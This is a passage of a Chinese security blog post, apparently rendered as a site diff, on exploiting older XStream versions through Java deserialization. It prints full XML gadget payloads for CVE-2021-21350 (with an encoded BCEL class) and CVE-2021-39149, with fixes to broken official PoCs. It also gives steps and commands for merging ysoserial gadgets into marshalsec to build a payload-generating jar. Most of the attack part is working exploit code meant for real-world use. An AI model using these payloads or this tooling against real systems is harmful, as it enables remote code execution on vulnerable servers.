class="string">&quot;java.lang.ProcessBuilder$NullInputStream&quot;</span>/&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">ibuffer</span>&gt;</span><span class="tag">&lt;/<span class="name">ibuffer</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">done</span>&gt;</span>false<span class="tag">&lt;/<span class="name">done</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">ostart</span>&gt;</span>0<span class="tag">&lt;/<span class="name">ostart</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">ofinish</span>&gt;</span>0<span class="tag">&lt;/<span class="name">ofinish</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">closed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">closed</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">&quot;../jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="CVE-2021-21350"><a href="#CVE-2021-21350" class="headerlink" title="CVE-2021-21350"></a>CVE-2021-21350</h5><p>影响版本:1.4.15及之前(1.4.4测试不通过)</p>
+<p>官方给的poc有问题，少了个字段。（大概是官方用的jdk版本很高，很多官方给的POC在jdk8都需要做改动才能跑起来）</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&#x27;javafx.collections.ObservableList$1&#x27;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&#x27;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">contentType</span>&gt;</span>text/plain<span class="tag">&lt;/<span class="name">contentType</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.SequenceInputStream&#x27;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">e</span> <span class="attr">class</span>=<span class="string">&#x27;javax.swing.MultiUIDefaults$MultiUIDefaultsEnumerator&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">iterator</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.tools.javac.processing.JavacProcessingEnvironment$NameProcessIterator&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">names</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.AbstractList$Itr&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">cursor</span>&gt;</span>0<span class="tag">&lt;/<span class="name">cursor</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">lastRet</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">lastRet</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">expectedModCount</span>&gt;</span>0<span class="tag">&lt;/<span class="name">expectedModCount</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">class</span>=<span class="string">&#x27;java.util.Arrays$ArrayList&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&#x27;string-array&#x27;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">string</span>&gt;</span>$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$5dPMO$c2$40$Q$7d$L$z$8bK$b1$I$f8$fd$c9I$f0$m$H$bdI$bc$Y$3dhQ$T$I$9e$97$b2$91bmI$v$c6$7f$e4$99$93$c4$83$3f$c0$le$9c$$$a8$d1$d9$ec$cc$ce$9byo$s$fb$f1$f9$f6$O$e0$Y$V$81$y$96$FV$b0jB$db$7e$n$c9$d68$d69686$Z2$N$_$f0$e2S$86t$b5$d6a0$ce$c2$9eb$b0$j$_P$d7$e3$c7$ae$8a$da$b2$eb$TRtBW$fa$j$ZyI$3e$H$8d$b8$ef$8d$Y$b8$d3$f2$95$g$9e0d$h$ae$3f$d7$cb$b7b$e9$3e4$e5P$f7$d2D$G$d1$K$c7$91$ab$$$bc$84$x4$e7p$m$9f$a4$85$F$I$8e$z$L$db$d8$b1$b0$8b$3d$86RR$a8$fb2$b8$af$9f$3f$bbj$Y$7ba$c0$60j$SC$e1$b7z$d3$j$u7$fe$D$b5$fb$91$92$3dZ$c1$jG$91$K$e2$ef$bc$5c$ad9$ff$bbhis4$T5$aa$97$b5$O$w$e0$f4k$89$a5$c0$92$c5$c8$e7$u$3b$a2$c8$u$9a$H$af$60$T$5d$b6$c8$L$8a$80A$t$83$3c$bd$acY$T$WaS$cc$a2$f0$pp$ab$F$B$7b$8a$d4$5d$Z$e9$v$cc$X$YW$T$N$K$og$90$d6$92E$S$83$9e$9c$pT$90T$5eK$t$83$96$e8r$a4$9a$9c$ba$88X$d2p$f9$Lz$e4$Y$c6$f2$B$A$A<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">outer-class</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">names</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">processorCL</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.bcel.internal.util.ClassLoader&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">parent</span> <span class="attr">class</span>=<span class="string">&#x27;sun.misc.Launcher$ExtClassLoader&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">package2certs</span> <span class="attr">class</span>=<span class="string">&#x27;hashtable&#x27;</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">classes</span> <span class="attr">defined-in</span>=<span class="string">&#x27;java.lang.ClassLoader&#x27;</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">classloader</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.bcel.internal.util.ClassLoader&#x27;</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">principals</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">hasAllPerm</span>&gt;</span>false<span class="tag">&lt;/<span class="name">hasAllPerm</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">staticPermissions</span>&gt;</span>false<span class="tag">&lt;/<span class="name">staticPermissions</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">key</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">key</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">defaultDomain</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">domains</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">packages</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">nativeLibraries</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">assertionLock</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.bcel.internal.util.ClassLoader&#x27;</span> <span class="attr">reference</span>=<span class="string">&#x27;..&#x27;</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">defaultAssertionStatus</span>&gt;</span>false<span class="tag">&lt;/<span class="name">defaultAssertionStatus</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">classes</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">ignored__packages</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>java.<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>sun.<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">ignored__packages</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">repository</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.bcel.internal.util.SyntheticRepository&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">__path</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">paths</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">class__path</span>&gt;</span>.<span class="tag">&lt;/<span class="name">class__path</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">__path</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">__loadedClasses</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">deferTo</span> <span class="attr">class</span>=<span class="string">&#x27;sun.misc.Launcher$ExtClassLoader&#x27;</span> <span class="attr">reference</span>=<span class="string">&#x27;../parent&#x27;</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">processorCL</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">iterator</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">type</span>&gt;</span>KEYS<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">e</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">in</span> <span class="attr">class</span>=<span class="string">&#x27;java.io.ByteArrayInputStream&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">buf</span>&gt;</span><span class="tag">&lt;/<span class="name">buf</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">pos</span>&gt;</span>0<span class="tag">&lt;/<span class="name">pos</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">mark</span>&gt;</span>0<span class="tag">&lt;/<span class="name">mark</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">count</span>&gt;</span>0<span class="tag">&lt;/<span class="name">count</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">in</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">transferFlavors</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data</span> <span class="attr">reference</span>=<span class="string">&#x27;../com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&#x27;</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="CVE-2021-39149"><a href="#CVE-2021-39149" class="headerlink" title="CVE-2021-39149"></a>CVE-2021-39149</h5><p>影响:1.4.17及之前(1.4.4测试可用)</p>
+<p>官方给的xml又有问题，看<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10360">backcover7师傅的文章</a> 发现官方的payload少了一段xml</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">linked-hash-set</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">interface</span>&gt;</span>map<span class="tag">&lt;/<span class="name">interface</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">handler</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl&#x27;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">classToInvocationHandler</span> <span class="attr">class</span>=<span class="string">&#x27;linked-hash-map&#x27;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">defaultHandler</span> <span class="attr">class</span>=<span class="string">&#x27;sun.tracing.NullProvider&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">active</span>&gt;</span>true<span class="tag">&lt;/<span class="name">active</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">providerType</span>&gt;</span>java.lang.Object<span class="tag">&lt;/<span class="name">providerType</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">probes</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">method</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.Object<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">name</span>&gt;</span>hashCode<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">method</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">sun.tracing.dtrace.DTraceProbe</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">proxy</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">__name</span>&gt;</span>Pwnr<span class="tag">&lt;/<span class="name">__name</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">__bytecodes</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">byte-array</span>&gt;</span>yv66vgAA......<span class="tag">&lt;/<span class="name">byte-array</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">__bytecodes</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">__transletIndex</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">__transletIndex</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">__indentNumber</span>&gt;</span>0<span class="tag">&lt;/<span class="name">__indentNumber</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">boolean</span>&gt;</span>false<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">proxy</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">implementing__method</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">name</span>&gt;</span>getOutputProperties<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">implementing__method</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">sun.tracing.dtrace.DTraceProbe</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">probes</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">defaultHandler</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">handler</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dynamic-proxy</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">linked-hash-set</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h5 id="CVE-2021-39153"><a href="#CVE-2021-39153" class="headerlink" title="CVE-2021-39153"></a>CVE-2021-39153</h5><p><a target="_blank" rel="noopener" href="https://x-stream.github.io/CVE-2021-39153.html">https://x-stream.github.io/CVE-2021-39153.html</a></p>
+<p>jdk必须在8–14且开启JavaFX，限制有点多没测。</p>
+<h5 id="CVE-2021-39139"><a href="#CVE-2021-39139" class="headerlink" title="CVE-2021-39139"></a>CVE-2021-39139</h5><p><a target="_blank" rel="noopener" href="https://x-stream.github.io/CVE-2021-39139.html">https://x-stream.github.io/CVE-2021-39139.html</a></p>
+<p>这个就是yso生成的jdk7u21的gadget…被拿去刷了个CVE.</p>
+<h5 id="用ysoserial的gadget打xstream反序列化"><a href="#用ysoserial的gadget打xstream反序列化" class="headerlink" title="用ysoserial的gadget打xstream反序列化"></a>用ysoserial的gadget打xstream反序列化</h5><p>官方的CVE在1.4.17前都没看到ysoserial中的gadget，但这并不代表ysoserial的gadget不能用，小测了下ysoserial常用的几个链子CC,CB等在1.4.17都是可以用的。</p>
+<h3 id="生成ysoserial的gadget"><a href="#生成ysoserial的gadget" class="headerlink" title="生成ysoserial的gadget"></a>生成ysoserial的gadget</h3><p>ysoserial里面的gadget都可以拿到xstream反序列化用，所以可以把marshalsec里的xstream模块提出来和ysoserial做个合体，可以参考<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/239865#h2-4">清水川崎师傅的文章</a>。</p>
+<h4 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h4><p>新建一个idea项目，将marshalsec和ysoserial都引入classpath作为依赖，把marshalsec.XStream抄到新建的项目中。</p>
+<p>以cb1为例，假如我们需要调用到cb1，我们把marshalsec.gadgets.CommonsBeanutils的代码原封不动的抄到当前项目，然后把其中的makeCommonsBeanutilsJNDI做改动即可，new一个<code>CommonsBeanutils1</code>类,然后使用<code>CommonsBeanutils1</code>的<code>getObject()</code>方法,</p>
+<p><img src="/2022/05/03/%E4%B8%80%E6%AC%A1%E4%BD%8E%E7%89%88%E6%9C%ACxstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/image-20220502175849915.png" alt="image-20220502175849915"></p>
+<p>把现在的工程打包成一个jar包，直接用marshalsec的CommonsBeanutils即是在调用我们yso的CommonsBeanutils1</p>
+<p><img src="/2022/05/03/%E4%B8%80%E6%AC%A1%E4%BD%8E%E7%89%88%E6%9C%ACxstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/image-20220502180149936.png" alt="image-20220502180149936"></p>
+<h4 id="增加gadget"><a href="#增加gadget" class="headerlink" title="增加gadget"></a>增加gadget</h4><p>实战中可能需要fuzz大量的gadget才能判断能不能利用，每次都得根据自己需要的gadget改代码会很麻烦，所以可以把常用的gadget做到一个jar包方便快速生成poc</p>
+<ol>
+<li><p>在marshalsec.gadgets新增gadget，gadget如果和yso中的gadget重名就无法正常初始化，所以可以用原yso的Gadget名后面加上特征以示区别，我这里是所有gadget后面加上yso。</p>
+</li>
+<li><p>可以看下我们marshalsec中marshalsec.XStream的main函数</p>
+</li>
+</ol>
+<p><img src="/2022/05/03/%E4%B8%80%E6%AC%A1%E4%BD%8E%E7%89%88%E6%9C%ACxstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/image-20220502180226135.png" alt="image-20220502180226135"></p>
+<p>跟进run方法</p>
+<p><img src="/2022/05/03/%E4%B8%80%E6%AC%A1%E4%BD%8E%E7%89%88%E6%9C%ACxstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/image-20220502180252887.png" alt="image-20220502180252887"></p>
+<p>可以看到我们main函数的逻辑是接收用户传入的参数args，然后进入<code>MarshallerBase</code>的run方法，然后通过一系列逻辑触发我们的gadget</p>
+<ol start="3">
+<li>上述流程中涉及到一处判断，marshalsec中的<code>MarshallerBase</code>类中319行</li>
+</ol>
+<p><img src="/2022/05/03/%E4%B8%80%E6%AC%A1%E4%BD%8E%E7%89%88%E6%9C%ACxstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/image-20220502180347811.png" alt="image-20220502180347811"></p>
+<p><code>t.getClazz().isAssignableFrom(this.getClass())</code>需要是true才能正常往下走逻辑，<code>t.getClaszz()</code>跟进参数可以发现是我们传参传入的gadget名，<code>this.getClass()</code>是我们的main函数marshalsec.XStream，百度<code>isAssignableFrom</code>函数</p>
+<p><img src="/2022/05/03/%E4%B8%80%E6%AC%A1%E4%BD%8E%E7%89%88%E6%9C%ACxstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/image-20220502180401320.png" alt="image-20220502180401320"></p>
+<p>该函数的作用简单来说是判断类或接口之间有没有继承关系，我们在marshalsec.gadgets中新增的gadget是一个interface，所以我们的main函数marshalsec.XStream得实现新增的接口。</p>
+<p><img src="/2022/05/03/%E4%B8%80%E6%AC%A1%E4%BD%8E%E7%89%88%E6%9C%ACxstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/image-20220502180512588.png" alt="image-20220502180512588"></p>
+<ol start="4">
+<li><p>剩下的就是新建marshalsec.gadgets.GadgetType类，把marshalsec中的代码抄过来，并新加gadget即可。</p>
+</li>
+<li><p>打包时出来的jar会报错,下面命令解决</p>
+</li>
+</ol>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -d xstreamlsec.jar &#x27;META-INF/.SF&#x27; &#x27;META-INF/.RSA&#x27; &#x27;META-INF/*SF&#x27;</span><br></pre></td></tr></table></figure>
+
+<h4 id="效果"><a href="#效果" class="headerlink" title="效果"></a>效果</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar xstreamlsec-1.0.0.jar URLDNSyso &quot;http://xx.xx.com&quot;</span><br></pre></td></tr></table></figure>
+
+<p>参数就跟正常使用yso一样</p>
+<p><img src="/2022/05/03/%E4%B8%80%E6%AC%A1%E4%BD%8E%E7%89%88%E6%9C%ACxstream%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E8%AE%B0%E5%BD%95/image-20220502193028484.png" alt="image-20220502193028484"></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
